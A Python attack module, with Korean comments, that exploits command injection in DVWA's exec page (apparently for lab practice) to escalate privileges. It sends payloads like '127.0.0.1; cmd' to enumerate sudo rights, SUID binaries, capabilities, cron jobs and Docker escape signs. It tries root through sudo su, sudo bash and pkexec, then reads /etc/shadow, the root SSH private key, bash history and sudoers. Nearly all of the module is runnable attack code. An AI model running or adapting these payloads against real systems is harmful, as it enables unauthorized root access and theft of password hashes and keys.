"""
Privilege Escalation Module
권한 상승 및 루트 권한 획득 모듈
"""

import time
import re
from utils.logger import log_attack, log_command_output

# 권한 상승 벡터
PRIVILEGE_ESCALATION_VECTORS = {
    'sudo_abuse': [
        # sudo 권한 확인
        'sudo -l',
        # sudo 버전 확인 (취약점 존재 가능)
        'sudo -V | head -1',
    ],
    'suid_binaries': [
        # SUID 바이너리 찾기 (권한 상승 가능)
        'find / -perm -4000 -type f 2>/dev/null | head -20',
        'find / -perm -u=s -type f 2>/dev/null | head -20',
    ],
    'capabilities': [
        # Linux Capabilities 확인
        'getcap -r / 2>/dev/null | head -20',
    ],
    'writable_paths': [
        # PATH에 쓰기 가능한 디렉토리 확인
        'echo $PATH',
        'find /usr/local/bin /usr/bin /bin -writable -type d 2>/dev/null',
    ],
    'cron_jobs': [
        # Cron 작업 확인 (권한 상승 가능)
        'cat /etc/crontab 2>/dev/null',
        'ls -la /etc/cron.d 2>/dev/null',
        'crontab -l 2>/dev/null',
    ],
    'kernel_exploits': [
        # 커널 버전 확인
        'uname -a',
        'cat /proc/version',
        'cat /etc/issue',
    ],
    'docker_escape': [
        # Docker 컨테이너 탈출 가능 여부
        'cat /proc/1/cgroup | grep -i docker',
        'ls -la /.dockerenv 2>/dev/null',
        'cat /proc/self/mountinfo | grep docker',
    ],
}

# 루트 권한 획득 시도
ROOT_ESCALATION_ATTEMPTS = [
    {
        'name': 'sudo su 시도',
        'command': 'echo "" | sudo -S su -c "whoami"',
        'success_indicator': 'root',
    },
    {
        'name': 'sudo bash 시도',
        'command': 'echo "" | sudo -S bash -c "whoami"',
        'success_indicator': 'root',
    },
    {
        'name': 'pkexec 시도',
        'command': 'pkexec whoami',
        'success_indicator': 'root',
    },
]

def run_attack(session, delay=1):
    """
    권한 상승 공격 실행

    Args:
        session: DVWA 세션 객체
        delay: 요청 간 지연 시간(초)

    Returns:
        dict: 공격 결과 통계
    """
    results = {
        'success': False,
        'attempts': 0,
        'successful': 0,
        'findings': {
            'current_user': None,
            'current_uid': None,
            'escalation_vectors': {},
            'root_achieved': False,
        }
    }

    print("\n  [*] ===========================================")
    print("  [*] 권한 상승 및 루트 권한 획득 시도")
    print("  [*] ===========================================\n")

    cmdi_url = f"{session.base_url}/vulnerabilities/exec/"

    # 1단계: 현재 사용자 확인
    print("  [1/4] 현재 사용자 및 권한 확인 중...")
    check_current_user(session, cmdi_url, results, delay)

    # 2단계: 권한 상승 벡터 탐색
    print("\n  [2/4] 권한 상승 벡터 탐색 중...")
    scan_escalation_vectors(session, cmdi_url, results, delay)

    # 3단계: 루트 권한 획득 시도
    print("\n  [3/4] 루트 권한 획득 시도 중...")
    attempt_root_escalation(session, cmdi_url, results, delay)

    # 4단계: 루트 권한 확인 및 활용
    if results['findings']['root_achieved']:
        print("\n  [4/4] 루트 권한 활용 중...")
        exploit_root_access(session, cmdi_url, results, delay)
    else:
        print("\n  [4/4] 루트 권한 획득 실패")

    if results['successful'] > 0:
        results['success'] = True

    print_privilege_escalation_summary(results)
    return results

def check_current_user(session, cmdi_url, results, delay):
    """현재 사용자 및 권한 확인"""
    commands = [
        ('whoami', 'current_user'),
        ('id', 'current_uid'),
        ('groups', 'groups'),
    ]

    for cmd, key in commands:
        results['attempts'] += 1

        try:
            payload = f"127.0.0.1; {cmd}"
            data = {'ip': payload, 'Submit': 'Submit'}

            response = session.session.post(cmdi_url, data=data)
            output = extract_command_output(response.text)

            if output:
                results['successful'] += 1
                results['findings'][key] = output

                log_command_output(cmd, 'user_enumeration', output, preview_lines=10)

                log_attack(
                    'USER_CHECK',
                    'SUCCESS',
                    f"Command: {cmd}",
                    response.status_code,
                    len(response.text)
                )

                print(f"    [+] {cmd}: {output}")

            time.sleep(delay)

        except Exception as e:
            log_attack('USER_CHECK', 'ERROR', f"Command: {cmd}, Error: {str(e)}", 0, 0)

def scan_escalation_vectors(session, cmdi_url, results, delay):
    """권한 상승 벡터 스캔"""

    for category, commands in PRIVILEGE_ESCALATION_VECTORS.items():
        print(f"    [*] {category} 확인 중...")
        category_findings = []

        for cmd in commands:
            results['attempts'] += 1

            try:
                payload = f"127.0.0.1; {cmd}"
                data = {'ip': payload, 'Submit': 'Submit'}

                response = session.session.post(cmdi_url, data=data)
                output = extract_command_output(response.text)

                if output and len(output) > 5:
                    results['successful'] += 1
                    category_findings.append({
                        'command': cmd,
                        'output': output
                    })

                    log_command_output(cmd, category, output, preview_lines=30)

                    log_attack(
                        'PRIVESC_VECTOR_SCAN',
                        'SUCCESS',
                        f"Category: {category}, Command: {cmd}",
                        response.status_code,
                        len(response.text)
                    )

                    # 중요한 발견 사항 표시
                    if 'sudo' in cmd and 'NOPASSWD' in output:
                        print(f"      [!] NOPASSWD sudo 발견! (권한 상승 가능)")
                    elif 'suid' in category.lower() and len(output) > 20:
                        print(f"      [+] SUID 바이너리 발견: {len(output.split())}개")
                    elif 'docker' in cmd and 'docker' in output.lower():
                        print(f"      [!] Docker 컨테이너 감지! (탈출 가능)")
                    else:
                        preview = output[:60].replace('\n', ' ')
                        print(f"      [+] {cmd[:50]}: {preview}...")

                time.sleep(delay)

            except Exception as e:
                log_attack('PRIVESC_VECTOR_SCAN', 'ERROR', f"Command: {cmd}, Error: {str(e)}", 0, 0)

        if category_findings:
            results['findings']['escalation_vectors'][category] = category_findings

def attempt_root_escalation(session, cmdi_url, results, delay):
    """루트 권한 획득 시도"""

    for attempt in ROOT_ESCALATION_ATTEMPTS:
        results['attempts'] += 1

        try:
            print(f"    [*] {attempt['name']}...")

            payload = f"127.0.0.1; {attempt['command']}"
            data = {'ip': payload, 'Submit': 'Submit'}

            response = session.session.post(cmdi_url, data=data)
            output = extract_command_output(response.text)

            if output and attempt['success_indicator'] in output.lower():
                results['successful'] += 1
                results['findings']['root_achieved'] = True

                log_command_output(
                    attempt['command'],
                    'root_escalation',
                    output,
                    preview_lines=20
                )

                log_attack(
                    'ROOT_ESCALATION',
                    'SUCCESS',
                    f"Method: {attempt['name']}",
                    response.status_code,
                    len(response.text)
                )

                print(f"    [!!!] 루트 권한 획득 성공! Method: {attempt['name']}")
                return True

            time.sleep(delay)

        except Exception as e:
            log_attack('ROOT_ESCALATION', 'ERROR', f"Method: {attempt['name']}, Error: {str(e)}", 0, 0)

    print(f"    [-] 루트 권한 획득 실패")
    return False

def exploit_root_access(session, cmdi_url, results, delay):
    """루트 권한 활용"""

    root_commands = [
        ('cat /etc/shadow', '시스템 패스워드 해시 탈취'),
        ('cat /root/.ssh/id_rsa', 'Root SSH 키 탈취'),
        ('cat /root/.bash_history', 'Root 명령어 히스토리'),
        ('cat /etc/sudoers', 'Sudo 설정 확인'),
        ('ls -la /root', 'Root 홈 디렉토리'),
    ]

    print(f"    [!] 루트 권한으로 민감 데이터 접근 중...")

    for cmd, description in root_commands:
        results['attempts'] += 1

        try:
            payload = f"127.0.0.1; sudo {cmd}"
            data = {'ip': payload, 'Submit': 'Submit'}

            response = session.session.post(cmdi_url, data=data)
            output = extract_command_output(response.text)

            if output and len(output) > 10:
                results['successful'] += 1

                log_command_output(
                    f"sudo {cmd}",
                    'root_exploitation',
                    output,
                    preview_lines=50
                )

                log_attack(
                    'ROOT_EXPLOITATION',
                    'SUCCESS',
                    f"Action: {description}",
                    response.status_code,
                    len(response.text)
                )

                print(f"      [+] {description}: {len(output)} bytes 탈취")

            time.sleep(delay)

        except Exception as e:
            log_attack('ROOT_EXPLOITATION', 'ERROR', f"Command: {cmd}, Error: {str(e)}", 0, 0)

def extract_command_output(html_response):
    """HTML 응답에서 명령어 출력 추출"""
    try:
        # <pre> 태그에서 추출
        pre_match = re.search(r'<pre>(.*?)</pre>', html_response, re.DOTALL | re.IGNORECASE)
        if pre_match:
            output = pre_match.group(1)
        else:
            # textarea에서 추출
            textarea_match = re.search(r'<textarea[^>]*>(.*?)</textarea>', html_response, re.DOTALL | re.IGNORECASE)
            if textarea_match:
                output = textarea_match.group(1)
            else:
                return ""

        # HTML 엔티티 디코딩
        output = output.replace('&lt;', '<').replace('&gt;', '>').replace('&amp;', '&')
        output = output.replace('&quot;', '"').replace('&#039;', "'")

        # ping 결과 완전 제거
        lines = output.split('\n')
        filtered_lines = []
        in_ping_section = False

        for line in lines:
            if 'PING 127.0.0.1' in line:
                in_ping_section = True
                continue
            if in_ping_section:
                if 'bytes from 127.0.0.1' in line:
                    continue
                if '127.0.0.1 ping statistics' in line:
                    continue
                if 'packets transmitted' in line:
                    continue
                if 'round-trip' in line or 'rtt min' in line:
                    continue
                if line.startswith('---'):
                    continue
                if not line.strip():
                    continue
                in_ping_section = False
            if line.strip():
                filtered_lines.append(line)

        return '\n'.join(filtered_lines).strip()
    except Exception:
        return ""

def print_privilege_escalation_summary(results):
    """권한 상승 결과 요약 출력"""
    print("\n  [*] ===========================================")
    print("  [*] 권한 상승 공격 결과 요약")
    print("  [*] ===========================================\n")

    print(f"  총 시도: {results['attempts']}회")
    print(f"  성공: {results['successful']}회\n")

    findings = results['findings']

    if findings.get('current_user'):
        print(f"  현재 사용자: {findings['current_user']}")

    if findings.get('current_uid'):
        print(f"  사용자 정보: {findings['current_uid']}")

    if findings.get('escalation_vectors'):
        print(f"\n  [+] 발견된 권한 상승 벡터:")
        for vector, data in findings['escalation_vectors'].items():
            print(f"      - {vector}: {len(data)}개 발견")

    if findings.get('root_achieved'):
        print(f"\n  [!!!] 루트 권한 획득: 성공! (최고 위험)")
    else:
        print(f"\n  [-] 루트 권한 획득: 실패")

    print()
